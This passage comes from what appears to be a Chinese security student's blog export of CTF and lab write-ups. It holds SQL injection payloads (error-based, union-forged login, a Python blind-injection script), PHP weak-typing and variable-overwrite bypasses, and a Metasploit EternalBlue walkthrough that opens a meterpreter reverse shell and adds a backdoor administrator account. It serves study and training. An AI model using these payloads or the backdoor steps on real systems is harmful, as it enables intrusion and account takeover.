?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">'H4rDsq1'</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>

<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
<p>显示后面的flag</p>
<div class="hljs"><pre><code class="hljs angelscript">?username=admin&amp;password=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select(right(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>



<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
<div class="hljs"><pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">'SET NAMES UTF8'</span>);
$name = $_POST[<span class="hljs-string">'name'</span>];
$password = $_POST[<span class="hljs-string">'pw'</span>];
$t_pw = md5($password);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
$sql = <span class="hljs-string">"select * from user where username = '"</span>.$name.<span class="hljs-string">"'"</span>;
<span class="hljs-comment">// echo $sql;</span>
$result = mysqli_query($con, $sql);

<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/\(|\)|\=|or/"</span>, $name))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
	<span class="hljs-keyword">die</span>(<span class="hljs-string">"do not hack me!"</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!$result) &#123;
		printf(<span class="hljs-string">"Error: %s\n"</span>, mysqli_error($con));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo '&lt;pre&gt;';</span>
		$arr = mysqli_fetch_row($result);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">"admin"</span>)&#123;
			<span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
				<span class="hljs-keyword">echo</span> $flag;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong pass!"</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong user!"</span>);
		&#125;
	&#125;
&#125;</code></pre></div>

<p>随便输入用户名和密码，查看源码，出现提示</p>
<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" srcset="/img/loading.gif" alt></p>
<p>试了试应该是base32，解码后是base64</p>
<div class="hljs"><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre></div>

<p>继续解码</p>
<div class="hljs"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">'$name'</span></code></pre></div>

<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
<p>值得注意的是，这题可以知道username是admin，</p>
<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
<p>接下来介绍一种新的union注入</p>
<p>先建立一张表</p>
<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> * from test where id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,'<span class="hljs-title">admin</span>','2322';</span></code></pre></div>

<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" srcset="/img/loading.gif" alt></p>
<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
<p>这里就是 id=1,username=admin,password=2322</p>
<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=000'union select 1,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="hljs-attribute">pw</span>=1111</code></pre></div>

<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" srcset="/img/loading.gif" alt></p>
<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
<p>可以看到当id = 1 时，页面回显为，可以将这个为判断的标志</p>
<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" srcset="/img/loading.gif" alt="image-20201223090038080"></p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
<span class="hljs-number">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre></div>

<p>所以可以将注入的payload加到中间，例如</p>
<div class="hljs"><pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">"%(i,ord(j))</span></code></pre></div>

<p>注入脚本如下，使用的是二分法</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">"http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php"</span>
flag = <span class="hljs-string">''</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span><span class="hljs-params">(i, j)</span>:</span>
    time.sleep(<span class="hljs-number">1</span>)
    <span class="hljs-comment"># sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1"%(i,j)                                #数据库名字          </span>
    <span class="hljs-comment"># sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1"%(i,j)           #表名</span>
    <span class="hljs-comment"># sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1"%(i,j)        #列名</span>
    sql = <span class="hljs-string">"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1"</span> % (i, j)
    data = &#123;<span class="hljs-string">"id"</span>: sql&#125;
    r = requests.get(url, params=data)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"Click"</span> <span class="hljs-keyword">in</span> r.text:
        res = <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        res = <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> flag
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
        print(i, <span class="hljs-string">':'</span>)
        low = <span class="hljs-number">31</span>
        high = <span class="hljs-number">127</span>
        <span class="hljs-keyword">while</span> low &lt;= high:
            mid = (low + high) // <span class="hljs-number">2</span>
            res = payload(i, mid)
            <span class="hljs-keyword">if</span> res:
                low = mid + <span class="hljs-number">1</span>
            <span class="hljs-keyword">else</span>:
                high = mid - <span class="hljs-number">1</span>
        f = int((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
            <span class="hljs-keyword">break</span>
        <span class="hljs-comment"># print (f)</span>
        flag += chr(f)
        print(flag)
exp()
print(<span class="hljs-string">'flag='</span>, flag)</code></pre></div>

<p>又学到了新的注入姿势，真不错</p>
<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
]]></content>
      <categories>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>二分注入</tag>
        <tag>报错注入</tag>
        <tag>union新姿势</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf-2</title>
    <url>/2020/09/02/nctf-2/</url>
    <content><![CDATA[<h1 id="NCTF-2"><a href="#NCTF-2" class="headerlink" title="NCTF-2"></a>NCTF-2</h1><a id="more"></a>

<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>题目源码给出</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;
    mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql=<span class="hljs-string">"select user from ctf where (user='"</span>.$user.<span class="hljs-string">"') and (pw='"</span>.$pass.<span class="hljs-string">"')"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/br&gt;'</span>.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  <span class="hljs-keyword">if</span>($query[user]==<span class="hljs-string">"admin"</span>) &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">if</span>($query[user] != <span class="hljs-string">"admin"</span>) &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);
  &#125;
&#125;
<span class="hljs-keyword">echo</span> $query[user];
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先post方法传递user和pass两个参数，然后带入sql语句中查询</p>
<p>注入点在这个位置</p>
<p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;</code></p>
<p><code>select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;)</code></p>
<p>构造语句</p>
<p><code>select user from ctf where (user=&#39;admin&#39;) or 1=1 #)   and (pw=&#39;&#39;)</code> </p>
<p>在username中填入<code>admin&#39;) or 1=1 #</code>或者<code>admin&#39;) and 1=1 #</code>，提交即可获得flag</p>
<h2 id="passcheck"><a href="#passcheck" class="headerlink" title="passcheck"></a>passcheck</h2><div class="hljs"><pre><code class="hljs php">$pass=@$_POST[<span class="hljs-string">'pass'</span>];
$pass1=***********;<span class="hljs-comment">//被隐藏起来的密码</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($pass))
&#123;
<span class="hljs-keyword">if</span>(@!strcmp($pass,$pass1))&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag:nctf&#123;*&#125;"</span>;
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"the pass is wrong!"</span>;
&#125;
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input pass!"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>strcmp() 函数比较两个字符串。</p>
<p><strong>注释：</strong>strcmp() 函数是二进制安全的，且对大小写敏感。</p>
<p><strong>提示：</strong>该函数与 <a href="https://www.w3school.com.cn/php/func_string_strncmp.asp" target="_blank" rel="noopener">strncmp()</a> 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。</p>
<p><img src="https://i.loli.net/2020/11/30/4fUTpLQAMK6eYiX.png" srcset="/img/loading.gif" alt></p>
<p>只有pass==pass1时才显示flag</p>
<p>感觉跟之前的变量覆盖相似</p>
<p><img src="https://i.loli.net/2020/11/30/AowyefxikHEWvuP.png" srcset="/img/loading.gif" alt></p>
<p><strong>知识点：</strong><br>　　strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0；<br>　　hackbar的使用，post方法<br>　　php弱类型，数组的使用。</p>
<p>参考： <a href="https://www.cnblogs.com/islsy/p/10667426.html" target="_blank" rel="noopener">https://www.cnblogs.com/islsy/p/10667426.html</a> </p>
<h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($number)</span></span>
<span class="hljs-function"></span>&#123;
       $one = ord(<span class="hljs-string">'1'</span>);
       $nine = ord(<span class="hljs-string">'9'</span>);
       <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)
       &#123;   
               $digit = ord($number&#123;$i&#125;);
               <span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) <span class="hljs-comment">//number中的数字不能在1-9</span>
               &#123;
                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
               &#125;
       &#125;
          <span class="hljs-keyword">return</span> $number == <span class="hljs-string">'54975581388'</span>; <span class="hljs-comment">//number的值等于54975581388，与之前if语句矛盾</span>
&#125;
$flag=<span class="hljs-string">'*******'</span>;
<span class="hljs-keyword">if</span>(noother_says_correct($_GET[<span class="hljs-string">'key'</span>]))
   <span class="hljs-keyword">echo</span> $flag;
<span class="hljs-keyword">else</span> 
   <span class="hljs-keyword">echo</span> <span class="hljs-string">'access denied'</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>尝试将54975581388转成十六进制</p>
<p>0xccccccccc,  c的a值为12，满足if判断语句</p>
<p><code>?key=0xccccccccc</code></p>
<h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>查看源码</p>
<div class="hljs"><pre><code class="hljs php">&lt;!--
<span class="hljs-comment">#GOAL: login as admin,then get the flag;</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">require</span> <span class="hljs-string">'db.inc.php'</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span><span class="hljs-params">($str)</span></span>&#123;  
	<span class="hljs-keyword">if</span>(get_magic_quotes_gpc())&#123;  <span class="hljs-comment">//防止注入</span>
		$str=stripslashes($str); <span class="hljs-comment">//添加 \</span>
	&#125;
	<span class="hljs-keyword">return</span> htmlentities($str, ENT_QUOTES);<span class="hljs-comment">//过滤掉单引号，双引号，或者兼而有之</span>
&#125;

$username = @clean((string)$_GET[<span class="hljs-string">'username'</span>]);<span class="hljs-comment">//对获取的参数进行了处理</span>
$password = @clean((string)$_GET[<span class="hljs-string">'password'</span>]);

$query=<span class="hljs-string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="hljs-string">'\' AND pass=\''</span>.$password.<span class="hljs-string">'\';'</span>;<span class="hljs-comment">//存在注入的语句</span>
$result=mysql_query($query);
<span class="hljs-keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="hljs-number">1</span>)&#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid password!'</span>);
&#125;

<span class="hljs-keyword">echo</span> $flag;
--&gt;</code></pre></div>

<p> <strong>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误</strong> </p>
<p> <code>SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;</code> </p>
<p> 反斜杠遇到单引号后，起到转义作用，实际sql语句如下</p>
<p><code>SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;;</code> </p>
<p>这里注入与之前的注入不同，这里针对的是password</p>
<p><code>SELECT * FROM users WHERE name=&#39; \&#39; AND pass=&#39;  or 1=1 --+&#39;;</code></p>
<p><code>\&#39; AND pass=</code> 作为name 参数的值</p>
<p>所以构造?name=&amp;password=or 1=1 –+</p>
<p><img src="/2020/09/02/nctf-2/sql2.png" srcset="/img/loading.gif" alt></p>
<h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123; <span class="hljs-comment">//post 方式接收两个参数</span>
   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);<span class="hljs-comment">//对pass  md5加密</span>
  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select pw from ctf where user='$user'"</span>));<span class="hljs-comment">//获取pw字段的值</span>
  <span class="hljs-keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; <span class="hljs-comment">// 比较pass和pw</span>
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);
  &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>poyload:</p>
<p><code>user= &#39; union select md(1) &amp;pass=1</code></p>
<p><code>select pw from ctf where user=&#39;&#39; union select md(1)</code> </p>
<p>此查询语句获得我pw值为md(1),所以<code>if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))</code>语句成立，显示flag</p>
<p>(还没完全理解)</p>
<h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p> 首页中给出很长的<code>jsfuck</code>，可以使用浏览器的<code>console</code>解码 ,给出一个页面</p>
<p>访问 <code>1bc29b36f623ba82aaf6724fd3b16718.php</code> </p>
<p><img src="https://i.loli.net/2020/11/30/wxG2Wpteo6hr1vy.png" srcset="/img/loading.gif" alt></p>
<p>提示在header里</p>
<p><img src="/2020/09/02/nctf-2/ch1.png" srcset="/img/loading.gif" alt></p>
<p>查看header</p>
<p><img src="https://i.loli.net/2020/11/30/6qnrk7WSDdpAh8L.png" srcset="/img/loading.gif" alt></p>
<p> <code>history of bash</code> 如果使用的是<code>bash</code>，在家目录中会生成<code>.bash_history</code>文件用来保存历史命令。<br>访问<code>.bash_history</code>文件，可以得到这样的历史命令 </p>
<p>url: <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a> </p>
<p>获得<code>zip -r flagbak.zip ./*</code></p>
<p>访问 <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>查看源码获取被注释的内容</p>
<div class="hljs"><pre><code class="hljs php">$file = $_GET[<span class="hljs-string">'file'</span>];
<span class="hljs-keyword">if</span>(@file_get_contents($file) == <span class="hljs-string">"meizijiu"</span>)&#123;
    <span class="hljs-keyword">echo</span> $nctf;
&#125;</code></pre></div>

<p>分析可得</p>
<p><strong>通过get方式传递<code>flle</code>=文件名</strong><br><strong>并且这个文件的内容==‘meizijiu’</strong><br><strong>如果等于就打印flag</strong> </p>
<p>php伪协议<code>php://input</code>来构造原始数据的只读流 </p>
<p><img src="https://i.loli.net/2020/11/30/gK2Y5WGCklp6qtx.png" srcset="/img/loading.gif" alt></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>参考 <a href="https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1</a> </p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php">&lt;!--<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;  
        $$key = $value;  
&#125;  
<span class="hljs-keyword">if</span>($name == <span class="hljs-string">"meizijiu233"</span>)&#123;
    <span class="hljs-keyword">echo</span> $flag;
&#125;--&gt;</code></pre></div>

<div class="hljs"><pre><code class="hljs routeros">GET:
?<span class="hljs-attribute">name</span>=meizijiu233</code></pre></div>





]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>php</tag>
        <tag>变量覆盖</tag>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>网安作业1</title>
    <url>/2020/09/27/homework/</url>
    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><a id="more"></a>

<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
<p>测试两台主机之间的通信情况</p>
<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" srcset="/img/loading.gif" alt="1.png"></p>
<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" srcset="/img/loading.gif" alt="2.png"> </p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：service postgresql start </p>
<p>查看服务状态：service postgresql status</p>
<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：msfdb init </p>
<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" srcset="/img/loading.gif" alt="3.png"> </p>
<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
<p><img src="https://i.loli.net/2020/11/30/OPuivdSaVlTIMsm.png" srcset="/img/loading.gif" alt="4.png"> </p>
<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动ｍｓｆ</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
<p>运行</p>
<div class="hljs"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploitwindows/smb/ms17_010_eternalblue</code></pre></div>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" srcset="/img/loading.gif" alt="5.png"> </p>
<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" srcset="/img/loading.gif" alt="6.png"></p>
<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
<div class="hljs"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp</code></pre></div>



<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
<p>成功获取shell</p>
<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" srcset="/img/loading.gif" alt="7.png"></p>
<p>查看ip地址验证是否为目标主机。</p>
<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" srcset="/img/loading.gif" alt="8.png"></p>
<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
<div class="hljs"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test abc123.com /add</code></pre></div>

<p>Username:test </p>
<p>password:abc123.com</p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<div class="hljs"><pre><code class="hljs dockerfile">net localgroup administrtors test /<span class="hljs-keyword">add</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" srcset="/img/loading.gif" alt="10.png"></p>
<p>目标主机上用户创建成功</p>
<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" srcset="/img/loading.gif" alt="11.png"></p>
<p>  <strong>实验结束</strong></p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>反序列化</p>
<a id="more"></a>
<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>举例说明</p>
